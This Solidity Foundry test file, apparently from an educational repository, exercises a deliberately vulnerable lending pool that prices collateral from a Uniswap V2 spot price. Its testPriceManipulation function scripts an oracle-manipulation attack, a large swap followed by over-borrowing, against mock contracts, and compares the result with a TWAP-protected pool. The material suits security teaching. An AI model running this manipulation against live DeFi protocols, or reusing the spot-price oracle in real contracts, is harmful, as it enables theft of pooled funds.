// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/vulnerable/oracle/PriceManipulation.sol";

/// @title OracleTest - Tests for oracle manipulation vulnerability
contract OracleTest is Test {
    // Mock Uniswap V2 Pair for testing
    MockUniswapV2Pair public pair;
    MockERC20 public collateralToken;
    MockERC20 public borrowToken;
    VulnerableLendingPool public vulnerablePool;
    SecureLendingPool public securePool;

    address alice = address(0x1);
    address bob = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        // Deploy mock tokens
        collateralToken = new MockERC20("Collateral", "COL");
        borrowToken = new MockERC20("Borrow", "BOR");

        // Deploy mock pair with initial reserves
        pair = new MockUniswapV2Pair(
            address(collateralToken),
            address(borrowToken),
            1000000 * 10**18, // reserve0
            2000000 * 10**18  // reserve1 (2:1 ratio)
        );

        // Deploy pools
        vulnerablePool = new VulnerableLendingPool(
            address(pair),
            address(collateralToken),
            address(borrowToken)
        );

        securePool = new SecureLendingPool(
            address(pair),
            address(collateralToken),
            address(borrowToken)
        );

        // Fund pools
        borrowToken.mint(address(vulnerablePool), 1000000 * 10**18);
        borrowToken.mint(address(securePool), 1000000 * 10**18);

        // Fund users
        collateralToken.mint(alice, 10000 * 10**18);
        collateralToken.mint(bob, 10000 * 10**18);
        collateralToken.mint(attacker, 100000 * 10**18);
        borrowToken.mint(attacker, 500000 * 10**18);

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(attacker, "Attacker");
    }

    /// @notice Test normal lending flow
    function testNormalLending() public {
        vm.startPrank(alice);
        collateralToken.approve(address(vulnerablePool), 1000 * 10**18);
        vulnerablePool.depositCollateral(1000 * 10**18);

        // Price is 2:1, so 1000 COL = 2000 BOR value
        // Max borrow = 2000 * 100 / 150 = 1333 BOR
        uint256 maxBorrow = 1333 * 10**18;
        vulnerablePool.borrow(maxBorrow);

        assertEq(vulnerablePool.borrowed(alice), maxBorrow);
        vm.stopPrank();
    }

    /// @notice Test price manipulation attack
    function testPriceManipulation() public {
        console.log("=== Price Manipulation Attack ===");

        // Initial price
        uint256 initialPrice = vulnerablePool.getPrice();
        console.log("Initial price:", initialPrice);

        // Attacker manipulates reserves
        vm.startPrank(attacker);

        // Swap large amount to manipulate price
        // Buy COL with BOR -> COL price increases
        borrowToken.transfer(address(pair), 500000 * 10**18);
        pair.swap(100000 * 10**18, 0, attacker, "");

        uint256 manipulatedPrice = vulnerablePool.getPrice();
        console.log("Manipulated price:", manipulatedPrice);

        // Price should be much higher now
        assertGt(manipulatedPrice, initialPrice * 2, "Price should be manipulated");

        // Now deposit small collateral and borrow large amount
        collateralToken.approve(address(vulnerablePool), 1000 * 10**18);
        vulnerablePool.depositCollateral(1000 * 10**18);

        // With manipulated price, can borrow much more
        uint256 maxBorrow = (1000 * 10**18 * manipulatedPrice * 100) / (vulnerablePool.COLLATERAL_RATIO() * 1e18);
        vulnerablePool.borrow(maxBorrow);

        console.log("Attacker borrowed:", maxBorrow);
        console.log("Expected with real price:", (1000 * 10**18 * initialPrice * 100) / (vulnerablePool.COLLATERAL_RATIO() * 1e18));

        // Attacker borrowed more than they should
        uint256 fairBorrow = (1000 * 10**18 * initialPrice * 100) / (vulnerablePool.COLLATERAL_RATIO() * 1e18);
        assertGt(maxBorrow, fairBorrow * 2, "Attacker over-borrowed");

        vm.stopPrank();

        // Swap back to restore price - attacker keeps the profit
        vm.prank(attacker);
        collateralToken.transfer(address(pair), 50000 * 10**18);
    }

    /// @notice Test TWAP prevents manipulation
    function testTWAPPreventsManipulation() public {
        // Initialize TWAP with some observations
        for (uint i = 0; i < 10; i++) {
            securePool.updatePrice();
            vm.warp(block.timestamp + 360); // 6 minutes
        }

        uint256 twapPrice = securePool.getPrice();
        console.log("TWAP price:", twapPrice);

        // Try to manipulate
        vm.startPrank(attacker);
        borrowToken.transfer(address(pair), 500000 * 10**18);
        pair.swap(100000 * 10**18, 0, attacker, "");

        // Update price after manipulation
        securePool.updatePrice();

        uint256 twapAfterManip = securePool.getPrice();
        console.log("TWAP after manipulation:", twapAfterManip);

        // TWAP should not change significantly
        assertApproxEqRel(twapAfterManip, twapPrice, 0.1e18, "TWAP should resist manipulation");

        vm.stopPrank();
    }

    /// @notice Fuzz test: Collateral ratio should always be maintained
    function testFuzz_CollateralRatio(uint96 collateral, uint96 borrowAmount) public {
        vm.assume(collateral > 100 * 10**18 && collateral < 10000 * 10**18);

        uint256 price = vulnerablePool.getPrice();
        uint256 maxBorrow = (collateral * price * 100) / (vulnerablePool.COLLATERAL_RATIO() * 1e18);

        vm.assume(borrowAmount > 0 && borrowAmount <= maxBorrow);

        vm.startPrank(alice);
        collateralToken.approve(address(vulnerablePool), collateral);
        vulnerablePool.depositCollateral(collateral);
        vulnerablePool.borrow(borrowAmount);
        vm.stopPrank();

        // Verify collateral ratio
        uint256 collateralValue = collateral * price / 1e18;
        uint256 borrowValue = vulnerablePool.borrowed(alice);
        uint256 ratio = (collateralValue * 100) / borrowValue;

        assertGe(ratio, 150, "Collateral ratio should be >= 150%");
    }

    /// @notice Test liquidation threshold
    function testLiquidation() public {
        vm.startPrank(alice);
        collateralToken.approve(address(vulnerablePool), 1000 * 10**18);
        vulnerablePool.depositCollateral(1000 * 10**18);

        uint256 maxBorrow = (1000 * 10**18 * vulnerablePool.getPrice() * 100) / (vulnerablePool.COLLATERAL_RATIO() * 1e18);
        vulnerablePool.borrow(maxBorrow);
        vm.stopPrank();

        // Price drops - collateral should be liquidatable
        pair.setReserves(1000000 * 10**18, 1000000 * 10**18); // 1:1 ratio now

        uint256 newPrice = vulnerablePool.getPrice();
        uint256 collateralValue = 1000 * 10**18 * newPrice / 1e18;
        uint256 borrowValue = vulnerablePool.borrowed(alice);

        console.log("Collateral value after price drop:", collateralValue);
        console.log("Borrow value:", borrowValue);

        // Should be under-collateralized
        assertLt(collateralValue * 100 / borrowValue, 150, "Should be under-collateralized");
    }
}

/// @title Mock contracts for testing
contract MockERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockUniswapV2Pair is IUniswapV2Pair {
    address public token0;
    address public token1;
    uint112 private reserve0;
    uint112 private reserve1;
    uint32 private blockTimestampLast;

    constructor(address _token0, address _token1, uint112 _reserve0, uint112 _reserve1) {
        token0 = _token0;
        token1 = _token1;
        reserve0 = _reserve0;
        reserve1 = _reserve1;
        blockTimestampLast = uint32(block.timestamp);
    }

    function getReserves() external view returns (uint112, uint112, uint32) {
        return (reserve0, reserve1, blockTimestampLast);
    }

    function setReserves(uint112 _reserve0, uint112 _reserve1) external {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
        blockTimestampLast = uint32(block.timestamp);
    }

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata) external {
        if (amount0Out > 0) {
            IERC20(token0).transfer(to, amount0Out);
            reserve0 -= uint112(amount0Out);
        }
        if (amount1Out > 0) {
            IERC20(token1).transfer(to, amount1Out);
            reserve1 -= uint112(amount1Out);
        }
    }
}
